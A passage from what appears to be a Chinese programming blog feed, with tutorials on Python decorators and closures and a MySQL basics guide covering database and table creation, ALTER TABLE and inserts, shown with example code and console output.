kwargs)ceshi1(100)ceshi1(100, 200)ceshi1(100, 200, 3300, mm=1000)</code></pre><p>OutPut</p><pre><code>------内部函数------------------Num1:-----------100------------Num1:----------- ()------------Num1:----------- {}------内部函数------------------Num1:-----------100------------Num1:----------- (200,)------------Num1:----------- {}------内部函数------------------Num1:-----------100------------Num1:----------- (200, 3300)------------Num1:----------- {&#39;mm&#39;: 1000}</code></pre><h2 id="对带有不定长返回值的函数进行装饰"><a href="#对带有不定长返回值的函数进行装饰" class="headerlink" title="对带有不定长返回值的函数进行装饰"></a>对带有不定长返回值的函数进行装饰</h2><pre><code>def set_func(func):    def call_func(*args, **kwargs):        print(&quot;------内部函数------&quot;)        return func(*args, **kwargs)    return call_func@set_funcdef ceshi1(num, *args, **kwargs):    print(&#39;------------Num1:-----------%d&#39; % num)    print(&#39;------------Num1:-----------&#39;, args)    print(&#39;------------Num1:-----------&#39;, kwargs)    return &quot;OK&quot;,&quot;测试&quot;,num,args,kwargs  # ceshi1函数的返回值,返回给call_func@set_funcdef ceshi2():    passreturn_value = ceshi1(100,666,name = &quot;张三&quot;,age=&#39;李四&#39;)print(return_value)test = ceshi2()print(test)</code></pre><p>OutPut</p><pre><code>------内部函数------------------Num1:-----------100------------Num1:----------- (666,)------------Num1:----------- {&#39;name&#39;: &#39;张三&#39;, &#39;age&#39;: &#39;李四&#39;}(&#39;OK&#39;, &#39;测试&#39;, 100, (666,), {&#39;name&#39;: &#39;张三&#39;, &#39;age&#39;: &#39;李四&#39;})------内部函数------None</code></pre><h2 id="对带有参数以及返回值的函数进行装饰"><a href="#对带有参数以及返回值的函数进行装饰" class="headerlink" title="对带有参数以及返回值的函数进行装饰"></a>对带有参数以及返回值的函数进行装饰</h2><pre><code>def set_func(func):    def call_func(a):        return func(a)    return call_func@set_func  # 等价于ceshi = set_func(ceshi)def ceshi(num):    return f&quot;-----------测试%d---------{num}&quot;print(ceshi(999))print(ceshi.__name__)</code></pre><p>OutPut</p><pre><code>-----------测试%d---------999call_func</code></pre><h2 id="使用同一个装饰器对多个函数进行装饰"><a href="#使用同一个装饰器对多个函数进行装饰" class="headerlink" title="使用同一个装饰器对多个函数进行装饰"></a>使用同一个装饰器对多个函数进行装饰</h2><pre><code>def set_func(func):    def call_func(n):        print(&quot;------内部函数------&quot;)        func(n)    return call_func@set_funcdef ceshi1(num):    print(&#39;------------Num1:-----------%d&#39; % num)@set_funcdef ceshi2(num):    print(&#39;------------Num2:-----------%d&#39; % num)# ceshi = set_func(ceshi1)ceshi1(100)print(ceshi1.__name__)# ceshi2 = set_func(ceshi2)ceshi2(900)print(ceshi2.__name__)</code></pre><p>OutPut</p><pre><code>------内部函数------------------Num1:-----------100call_func------内部函数------------------Num2:-----------900call_func</code></pre><h2 id="多个装饰器对一个函数进行装饰"><a href="#多个装饰器对一个函数进行装饰" class="headerlink" title="多个装饰器对一个函数进行装饰"></a>多个装饰器对一个函数进行装饰</h2><pre><code>def p_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return fun_wrapperdef strong_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;strong&gt;{func(name)}&lt;/strong&gt;&#39;    return fun_wrapperdef div_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;div&gt;{func(name)}&lt;/div&gt;&#39;    return fun_wrapperdef get_text(name):    return f&quot;我最喜欢的编程语言是:{name}&quot;get_1 = div_decorate(p_decorate(strong_decorate(get_text)))print(get_1(&quot;Java&quot;))</code></pre><p>OutPut</p><pre><code>&lt;div&gt;&lt;p&gt;&lt;strong&gt;我最喜欢的编程语言是:Java&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;</code></pre><p>对上面的代码<strong>使用装饰器的语法进行装饰.</strong></p><pre><code>def p_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return fun_wrapperdef strong_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;strong&gt;{func(name)}&lt;/strong&gt;&#39;    return fun_wrapperdef div_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;装饰器&#39;&#39;&#39;        return f&#39;&lt;div&gt;{func(name)}&lt;/div&gt;&#39;    return fun_wrapper# 多个装饰器对一个函数进行装饰的过程# 从上到下进行执行,但是装饰是从下到上@div_decorate@p_decorate@strong_decoratedef get_text(name):    return f&quot;我最喜欢的编程语言是:{name}&quot;print(get_text(&#39;Python&#39;))</code></pre><p>OutPut</p><pre><code>&lt;div&gt;&lt;p&gt;&lt;strong&gt;我最喜欢的编程语言是:Python&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;</code></pre><h2 id="验证装饰器的装饰过程"><a href="#验证装饰器的装饰过程" class="headerlink" title="验证装饰器的装饰过程"></a>验证装饰器的装饰过程</h2><p>在这个例子中我们可以看到,两个被装饰的函数<strong>ceshi1()</strong>,和<strong>ceshi2()</strong>,在没有被调用的时候,就已经被装饰过了.</p><pre><code>def set_func(func):    print(&quot;测试在没有调用函数的时候装饰器是否已经装饰了&quot;)    def call_func(n):        print(&quot;------内部函数------&quot;)        func(n)    return call_func@set_funcdef ceshi1(num):    print(&#39;------------Num1:-----------%d&#39; % num)@set_funcdef ceshi2(num):    print(&#39;------------Num2:-----------%d&#39; % num)</code></pre><p>OutPut</p><pre><code>测试在没有调用函数的时候装饰器是否已经装饰了测试在没有调用函数的时候装饰器是否已经装饰了</code></pre><h2 id="使用类当作装饰器"><a href="#使用类当作装饰器" class="headerlink" title="使用类当作装饰器"></a>使用类当作装饰器</h2><pre><code>class Test(object):    def __init__(self,func):        self.func = func    def __call__(self):        print(&quot;装饰器被调用&quot;)        return f&#39;&lt;p&gt;{self.func()}&lt;/p&gt;&#39;@Testdef get_str():    return &quot;I like Python&quot;print(get_str())</code></pre><p>OutPut</p><pre><code>装饰器被调用&lt;p&gt;I like Python&lt;/p&gt;</code></pre><h1 id="使用Functool重置函数的属性"><a href="#使用Functool重置函数的属性" class="headerlink" title="使用Functool重置函数的属性"></a>使用Functool重置函数的属性</h1><p>Python中万物皆对象,函数也是一个对象,他的内置属性有__name__,__doc__,__module__.但是当我们使用装饰器装饰某函数的时候,他的内置属性会被覆盖.一个简单的例子</p><pre><code>def p_docorate(func):    def func_wrapper(name):        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return func_wrapper@p_docoratedef get_text(name):    return f&#39;你喜欢{name}&#39;print(get_text.__name__)        # 每个python函数中都有一个__name__属性,除非特别指定,否则类的对象不具有此属性</code></pre><p>OutPut</p><pre><code>func_wrapper</code></pre><p>可以看到这里的输出为func_wrapper,为什么我们明明查看的get_text的name属性,最后的输出却是func_wrapper呢?那是因为当我们使用装饰器装饰get_text函数的时候,get_text函数的name属性被装饰器覆盖了.下面我们不使用装饰器来试试.</p><pre><code>def get_text(name):    return f&#39;你喜欢{name}&#39;print(get_text.__name__)        </code></pre><p>OutPut</p><pre><code>get_text</code></pre><p>那么我们如何才能使用原函数的内置属性呢?被装饰后的函数本质上已经不是原来的函数了，所以原函数的某些属性如：__name__、__doc__等值就变了。而@wraps()的作用就是把原函数的相关信息代入到新的函数中。</p><pre><code>from functools import wrapsdef tags(tag_name):    def tags_decoator(func):        @wraps(func)        def func_wrapper(name):            return f&#39;&lt;{tag_name}&gt;{func(name)}&lt;/{tag_name}&gt;&#39;        return func_wrapper    return tags_decoator@tags(&quot;p&quot;)def get_text(name):    &quot;&quot;&quot;返回hello name &quot;&quot;&quot;    return f&#39;Hello {name}&#39;print(get_text.__name__)print(get_text.__doc__)print(get_text.__module__)</code></pre><p>OutPut</p><pre><code>get_text返回hello name __main__</code></pre><h1 id="装饰器效率测试"><a href="#装饰器效率测试" class="headerlink" title="装饰器效率测试"></a>装饰器效率测试</h1><pre><code>import functoolsimport timedef timer(func):    &quot;&quot;&quot;print被装饰器装饰的函数的运行时间&quot;&quot;&quot;    @functools.wraps(func)    def wrapper_timer(*args, **kwargs):        start_time = time.perf_counter()    # 1        value = func(*args, **kwargs)        end_time = time.perf_counter()      # 2        run_time = end_time - start_time    # 3        print(f&quot;Finished {func.__name__!r} in {run_time:.4f} secs&quot;)        return value    return wrapper_timer@timerdef waste_some_time(num_times):    for _ in range(num_times):        sum([i**2 for i in range(10000)])if __name__ == &#39;__main__&#39;:    waste_some_time(999)</code></pre><h1 id="使用装饰器的两个实例"><a href="#使用装饰器的两个实例" class="headerlink" title="使用装饰器的两个实例"></a>使用装饰器的两个实例</h1><p><strong>使用装饰器确保传递给函数的参数是一个整数,不是整数则抛出异常</strong></p><pre><code>def argument_test_natural_number(func):    def wrapper(x):        if type(x) == int and x &gt; 0:            return func(x)        else:            raise Exception(&quot;参数必须是整数&quot;)    return wrapper@argument_test_natural_numberdef factorial(num):    if num == 1:        return 1    else:        return num * factorial(num - 1)for i in range(1, 10):    print(i, factorial(i))print(factorial(-1))</code></pre><p>Output</p><pre><code>执行for循环的结果1 12 23 64 245 1206 7207 50408 403209 362880执行print(factorial(-1))的结果Traceback (most recent call last):  File &quot;L:/TestPythonScriptFolder/装饰器/装饰器使用实例1.py&quot;, line 32, in &lt;module&gt;    print(factorial(-1))  File &quot;L:/TestPythonScriptFolder/装饰器/装饰器使用实例1.py&quot;, line 16, in wrapper    raise Exception(&quot;参数必须是整数&quot;)Exception: 参数必须是整数</code></pre><p><strong>使用装饰器计算函数的调用次数</strong></p><pre><code>def call_counter(func):    def wrapper(x):        wrapper.testLove = x        # 函数名.xxx是函数的一个属性Python中的所有东西都是一个对象，函数也是对象(也具有属性).        # print(f&#39;内部函数:{wrapper.calls}&#39;)        # print(id(wrapper.calls))        return func(x)    wrapper.testLove = 0    # print(f&#39;外部函数:{wrapper.calls}&#39;)    return wrapper@call_counterdef succ(x):    return x + 1print(succ.testLove)for i in range(10):    succ(10)print(succ.testLove)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python闭包</title>
      <link href="/2018/12/02/python-bi-bao/"/>
      <url>/2018/12/02/python-bi-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h1><p>百度百科:</p><blockquote><p>闭包就是能够读取其他函数内部变量的函数。</p></blockquote><p>Wiki百科:</p><blockquote><p>在编程语言中，闭包（也是词法闭包或函数闭包）是一种在具有第一类函数的语言中实现词法范围的 名称绑定的技术。在操作上，闭包是将函数与环境一起存储的记录。环境是一个映射，它将函数的每个自由变量（本地使用的变量，但在封闭范围中定义）与值或引用相关联。创建闭包时绑定名称的名称。闭包 - 与普通函数不同 - 允许函数通过闭包的值或引用的副本访问那些捕获的变量，即使函数在其作用域之外调用也是如此。</p></blockquote><p>在了解Python闭包之前我们需要知道Python中的<strong>嵌套函数</strong>和<strong>非局部变量</strong></p><h1 id="嵌套函数"><a href="#嵌套函数" class="headerlink" title="嵌套函数"></a>嵌套函数</h1><p>在一个函数内定义的另一个函数,这样的函数被称为嵌套函数,<strong>嵌套函数可以访问封闭范围的变量,但是在Pyton中封闭范围的变量只是Readonly(只读)的,只能使用nonlocal关键字来修改它们.</strong></p><p>下面的例子中<strong>innerFunction()</strong>就是一个<strong>嵌套函数</strong></p><pre><code>&quot;&quot;&quot;   File Name:嵌套函数   Date：2018/12/2   Change Activity:2018/12/2   Description:&quot;&quot;&quot;def outerFunction(msg):    # 外部函数    msg = msg    def innerFunction():        # 内部函数        print(msg)      # 这里的msg使用的是外部函数中的msg变量    innerFunction()     # 调用内部函数if __name__ == &#39;__main__&#39;:    outerFunction(&quot;Python&quot;)</code></pre><h1 id="非局部变量"><a href="#非局部变量" class="headerlink" title="非局部变量"></a>非局部变量</h1><p><strong>非局部变量</strong>:Python3引入和一个新的<strong>关键字</strong>nonlocal,这个关键字的作用是允许使用在外部<strong>而不是全局范围内的变量</strong>.</p><p>在下面这个函数中msg是在外部函数中进行声明和赋值的,但是在内部函数中我们又给他进行了赋值,但是当我们在外部函数中调用内部函数时,msg的值为inside,但是当我们print外部函数的msg的值是他的值还是旧值outside.</p><pre><code>def outside():        msg = &quot;Outside!&quot;        def inside():            msg = &quot;Inside!&quot;            print(msg)        inside()        print(msg)outside()</code></pre><p>OutPut:</p><pre><code>Inside!Outside!</code></pre><p>为什么会造成这种情况呢?因为Python实际上没有分配给现有的msg变量,而是在内部函数中创建了一个新的变量msg,该变量隐藏了外部作用域中变量的名称.这里我们可以使用id()方法来验证.</p><pre><code>def outside():        msg = &quot;Outside!&quot;        print(id(msg))        def inside():            msg = &quot;Inside!&quot;            print(msg)            print(id(msg))        inside()        print(msg)outside()</code></pre><p>OutPut:</p><pre><code>1804225423408Inside!1804226238592Outside!</code></pre><p>那么我们如何在嵌套函数修改外部变量中的值呢?</p><p>答案是:nonlocal关键字</p><pre><code>def outside():    msg = &quot;Outside!&quot;    def inside():        nonlocal msg        msg = &quot;Inside!&quot;        print(msg)    inside()    print(msg)outside()</code></pre><p>OutPut:</p><pre><code>Inside!Inside!</code></pre><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><p>在<strong>函数内部再定义一个函数</strong>，并且这<strong>个函数用到了外边函数的变量</strong>，那么将<strong>这个函数以及用到的一些变量称之为闭包</strong></p><pre><code>def outerFunction(number):    &#39;&#39;&#39;外部函数&#39;&#39;&#39;    def innerFunction(number_in):        &#39;&#39;&#39;嵌套函数&#39;&#39;&#39;        print(f&#39;外部函数中参数number的值:{number}&#39;)        print(f&#39;嵌套函数中参数number_in的值:{number_in}&#39;)        return number + number_in    return innerFunction    # 这里返回的是内部函数的引用,而不是内部函数的值,带括号代表引用,不带括号表示执行if __name__ == &#39;__main__&#39;:    inner = outerFunction(100)      # 给外部函数赋值,这里外部函数返回的是嵌套函数的引用(innerFunction)    print(inner)    inner(200)      # 这里才是调用的嵌套函数    print(inner(200))       # print出嵌套函数的返回值 number+number_in</code></pre><p>OutPut:</p><pre><code>&lt;function outerFunction.&lt;locals&gt;.innerFunction at 0x0000017C8B987620&gt;外部函数中参数number的值:100嵌套函数中参数number_in的值:200外部函数中参数number的值:100嵌套函数中参数number_in的值:200300</code></pre><p>在上面的代码中我们可以看出,通过使用闭包,我们<strong>可以调用其范围之外的函数.</strong></p><p><strong>注意</strong>:<br>由于<strong>闭包引用了外部函数的局部变量</strong>，则<strong>外部函数的局部变量没有及时释放，消耗内存</strong></p><p><strong>什么时候使用闭包</strong><br><strong>闭包可以避免使用全局变量并提供某种形式的数据隐藏</strong>。（例如，当类中的方法很少时，使用闭包）。</p><p>Python中的<strong>装饰器</strong>广泛使用闭包。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>创建一个python闭包，使函数可以使用闭包获得多个乘法函数。</p><pre><code>def multiplier_of(n):    def multiplier(number):        return number * n    return multipliermultiplier = multiplier_of(5)  # return multiplierresult = multiplier(10)  # multiplier(10)print(result)  # return number * n</code></pre><p>OutPut:</p><pre><code>50</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql基础</title>
      <link href="/2018/11/20/mysql-ji-chu/"/>
      <url>/2018/11/20/mysql-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-简介"><a href="#MySQL-简介" class="headerlink" title="MySQL 简介"></a>MySQL 简介</h1><p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB公司开发，后来被Sun公司收购，Sun公司后来又被Oracle公司收购，目前属于Oracle旗下产品</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li><p>使用C和C++编写，并使用了多种编译器进行测试，保证源代码的可移植性</p></li><li><p>支持多种操作系统，如Linux、Windows、AIX、FreeBSD、HP-UX、MacOS、NovellNetware、OpenBSD、OS/2 Wrap、Solaris等</p></li><li><p>为多种编程语言提供了API，如C、C++、Python、Java、Perl、PHP、Eiffel、Ruby等</p></li><li><p>支持多线程，充分利用CPU资源</p></li><li>优化的SQL查询算法，有效地提高查询速度</li><li>提供多语言支持，常见的编码如GB2312、BIG5、UTF8</li><li>提供TCP/IP、ODBC和JDBC等多种数据库连接途径</li><li>提供用于管理、检查、优化数据库操作的管理工具</li><li>大型的数据库。可以处理拥有上千万条记录的大型数据库</li><li>支持多种存储引擎</li><li>MySQL 软件采用了双授权政策，它分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放- 源码这一特点，一般中小型网站的开发都选择MySQL作为网站数据库</li><li>MySQL使用标准的SQL数据语言形式</li><li>Mysql是可以定制的，采用了GPL协议，你可以修改源码来开发自己的Mysql系统</li><li>在线DDL更改功能</li><li>复制全局事务标识</li><li>复制无崩溃从机</li><li>复制多线程从机</li></ul><h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><p>链接Mysql数据库</p><p>mysql -u root -p</p><p>退出数据库</p><p>exit,quit,Ctrl+d</p><p>显示时间</p><p>select time();</p><p>显示Mysql版本</p><p>select version();</p><p><strong>查看所有数据库</strong></p><p>show databases;</p><p><strong>创建数据库(8.0.13默认的字符编码为utf8mb4)</strong></p><p>create database 数据库名 charset=utf8;</p><p>create database python;</p><p><strong>创建数据库并指定编码</strong></p><p>create database Python charset=utf8;</p><p><strong>删除数据库</strong></p><p>drop database 数据库名;</p><p>drop database Python;</p><p><strong>查看创建数据库的语句</strong></p><p>show create database Python;</p><p><strong>数据库名字注意事项</strong></p><p>当数据库名字中有特殊字符时,<strong>数据库名字使用<code></code>(波浪号,Table键上面的键)</strong></p><pre><code>mysql&gt; create database Python-1    -&gt; ;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;-1&#39; at line 1mysql&gt; create database `Python-1`;Query OK, 1 row affected (0.06 sec)mysql&gt; drop database `Python-1`    -&gt; ;Query OK, 0 rows affected (0.02 sec)</code></pre><p><strong>查看当前使用的数据库</strong></p><p>select database();</p><pre><code>mysql&gt; select database;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; at line 1mysql&gt; select database();+------------+| database() |+------------+| NULL       |+------------+1 row in set (0.00 sec)</code></pre><p><strong>使用数据库</strong></p><p>use 数据库名;</p><p>use Python</p><pre><code>mysql&gt; use Python;Database changedmysql&gt; select database();+------------+| database() |+------------+| Python     |+------------+1 row in set (0.00 sec)</code></pre><h1 id="数据表的操作"><a href="#数据表的操作" class="headerlink" title="数据表的操作"></a>数据表的操作</h1><p><strong>查看当前数据库中所有表</strong></p><p>show tables;</p><p><strong>在当前数据库中创建表</strong></p><p>create table Class(id int,name varchar(2));</p><pre><code>mysql&gt; create table Class(id int,name varchar(20));Query OK, 0 rows affected (0.13 sec)mysql&gt; show tables;+------------------+| Tables_in_Python |+------------------+| Class            |+------------------+1 row in set (0.00 sec)</code></pre><p><strong>创建表的同时添加约束</strong></p><p>create table student(id int primary key not null auto_increment,name varchar(20));<br>Query OK, 0 rows affected (0.14 sec)</p><pre><code>mysql&gt; desc student;+-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | NULL    | auto_increment || name  | varchar(20) | YES  |     | NULL    |                |+-------+-------------+------+-----+---------+----------------+2 rows in set (0.00 sec)</code></pre><p><strong>Mysql命令行支持换行,使用换行创建表</strong></p><p>使用换行创建表并添加约束会比不换行可读性要好</p><pre><code>mysql&gt; create table teacher(    -&gt; id int primary key not null auto_increment,    -&gt; name varchar(20),    -&gt; age int not null);Query OK, 0 rows affected (0.10 sec)mysql&gt; desc teacher;+-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | NULL    | auto_increment || name  | varchar(20) | YES  |     | NULL    |                || age   | int(11)     | NO   |     | NULL    |                |+-------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec)</code></pre><p><strong>查看数据表的结构</strong></p><p>desc 表名;</p><p>desc Class</p><pre><code>mysql&gt; desc Class;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id    | int(11)     | YES  |     | NULL    |       || name  | varchar(20) | YES  |     | NULL    |       |+-------+-------------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>创建students表(id、name、age、high、gender、cls_id)</p><p>create table students( id int unsigned not null auto_increment primary key, name varchar(30), age tinyint unsigned default 0, high decimal(5,2), gender enum(“男”,”女”,”中性”,”保密”) default “保密”, cls_id int unsigned );</p><pre><code>mysql&gt; create table students(    -&gt; id int unsigned not null auto_increment primary key,    -&gt; name varchar(30),    -&gt; age tinyint unsigned default 0,    -&gt; high decimal(5,2),    -&gt; gender enum(&quot;男&quot;,&quot;女&quot;,&quot;中性&quot;,&quot;保密&quot;) default &quot;保密&quot;,    -&gt; cls_id int unsigned    -&gt; );Query OK, 0 rows affected (0.35 sec)mysql&gt; desc students;+--------+-------------------------------------+------+-----+---------+----------------+| Field  | Type                                | Null | Key | Default | Extra          |+--------+-------------------------------------+------+-----+---------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name   | varchar(30)                         | YES  |     | NULL    |                || age    | tinyint(3) unsigned                 | YES  |     | 0       |                || high   | decimal(5,2)                        | YES  |     | NULL    |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)        | YES  |     | 保密     |                || cls_id | int(10) unsigned                    | YES  |     | NULL    |                |+--------+-------------------------------------+------+-----+---------+----------------+6 rows in set (0.01 sec)</code></pre><p>创建Class表(id,name)</p><pre><code>mysql&gt; create table class(    -&gt; id int unsigned not null auto_increment primary key,    -&gt; name varchar(20)    -&gt; );Query OK, 0 rows affected (0.34 sec)mysql&gt; desc class;+-------+------------------+------+-----+---------+----------------+| Field | Type             | Null | Key | Default | Extra          |+-------+------------------+------+-----+---------+----------------+| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment || name  | varchar(20)      | YES  |     | NULL    |                |+-------+------------------+------+-----+---------+----------------+2 rows in set (0.00 sec)</code></pre><p><strong>插入数据</strong></p><p>insert into class values(0,”Python高级开发班”);</p><pre><code>mysql&gt; insert into class values(0,&quot;Python高级开发班&quot;);Query OK, 1 row affected (0.28 sec)</code></pre><p>insert into students values(0,”曹操”,18,179.5,”女”,0);</p><pre><code>mysql&gt; select * from students;Empty set (0.00 sec)mysql&gt; insert into students values(0,&quot;曹操&quot;,18,175.5,&quot;女&quot;,0);Query OK, 1 row affected (0.09 sec)</code></pre><p><strong>查询数据</strong></p><p>select * from class;</p><pre><code>mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Python高级开发班      |+----+-----------------------+1 row in set (0.00 sec)</code></pre><p>select * from students;</p><pre><code>mysql&gt; select * from students;+----+--------+------+--------+--------+--------+| id | name   | age  | high   | gender | cls_id |+----+--------+------+--------+--------+--------+|  1 | 曹操   |   18 | 175.50 | 女     |      0 |+----+--------+------+--------+--------+--------+1 row in set (0.00 sec)</code></pre><p>修改表–添加字段</p><p>alter table 表名 add 列名 类型;</p><p>alter table students <strong>add</strong> birthday datetime;</p><pre><code>mysql&gt; alter table students add birthday datetime;Query OK, 0 rows affected (0.15 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+----------+-------------------------------------+------+-----+---------+----------------+| Field    | Type                                | Null | Key | Default | Extra          |+----------+-------------------------------------+------+-----+---------+----------------+| id       | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name     | varchar(30)                         | YES  |     | NULL    |                || age      | tinyint(3) unsigned                 | YES  |     | 0       |                || high     | decimal(5,2)                        | YES  |     | NULL    |                || gender   | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密    |                || cls_id   | int(10) unsigned                    | YES  |     | NULL    |                || birthday | datetime                            | YES  |     | NULL    |                |+----------+-------------------------------------+------+-----+---------+----------------+7 rows in set (0.00 sec)</code></pre><p>修改表–修改字段,不重命名字段名</p><p>alter table 表名 <strong>modify</strong> 列名 类型及约束;</p><p>alter table students <strong>modify</strong> birthday date;</p><pre><code>mysql&gt; alter table students modify birthday date;Query OK, 1 row affected (0.19 sec)Records: 1  Duplicates: 0  Warnings: 0mysql&gt; desc students;+----------+-------------------------------------+------+-----+---------+----------------+| Field    | Type                                | Null | Key | Default | Extra          |+----------+-------------------------------------+------+-----+---------+----------------+| id       | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name     | varchar(30)                         | YES  |     | NULL    |                || age      | tinyint(3) unsigned                 | YES  |     | 0       |                || high     | decimal(5,2)                        | YES  |     | NULL    |                || gender   | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密    |                || cls_id   | int(10) unsigned                    | YES  |     | NULL    |                || birthday | date                                | YES  |     | NULL    |                |+----------+-------------------------------------+------+-----+---------+----------------+7 rows in set (0.00 sec)</code></pre><p>修改表–修改字段,重命名字段名,并给字段添加默认值</p><p>alter table 表名 <strong>change</strong> 原名 新名 类型及约束;</p><p>alter table students <strong>change</strong> birthday birth date default “1990-01-01”;</p><pre><code>mysql&gt; alter table students change birthday birth date default &quot;1990-01-01&quot;;Query OK, 0 rows affected (0.09 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || high   | decimal(5,2)                        | YES  |     | NULL       |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+7 rows in set (0.01 sec)</code></pre><p>修改表–删除字段</p><p>alter table 表名 <strong>drop</strong> 列名;</p><p>alter table students drop high;</p><pre><code>mysql&gt; alter table students drop high;Query OK, 0 rows affected (0.24 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)</code></pre><p>删除表</p><p>drop table 表名;</p><p>drop table students;</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         || xxxx             |+------------------+3 rows in set (0.00 sec)mysql&gt; drop table xxxx;Query OK, 0 rows affected (0.09 sec)mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)</code></pre><p><strong>查看表的创建语句</strong></p><p>show create table 表名;</p><p>这里可以查看数据库使用的引擎,这里本人使用的是<strong>InnDB引擎</strong>.</p><p><strong>Mysql引擎详情自行Googld:MySQL几种常用的存储引擎区别</strong></p><pre><code>mysql&gt; show create table students;+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table    | Create Table                                                                                |+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| students | CREATE TABLE `students` (  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,  `name` varchar(30) DEFAULT NULL,  `age` tinyint(3) unsigned DEFAULT &#39;0&#39;,  `gender` enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;) DEFAULT &#39;保密&#39;,  `cls_id` int(10) unsigned DEFAULT NULL,  `birth` date DEFAULT &#39;1990-01-01&#39;,  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci         |+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><h1 id="数据表的增删改查-CRUD"><a href="#数据表的增删改查-CRUD" class="headerlink" title="数据表的增删改查(CRUD)"></a>数据表的增删改查(CRUD)</h1><h2 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h2><p><strong>全列插入</strong></p><p>insert into 表名 values(…);</p><p>向班级表中插入一个班级</p><p>insert into class values(2,”Python入门班”);</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 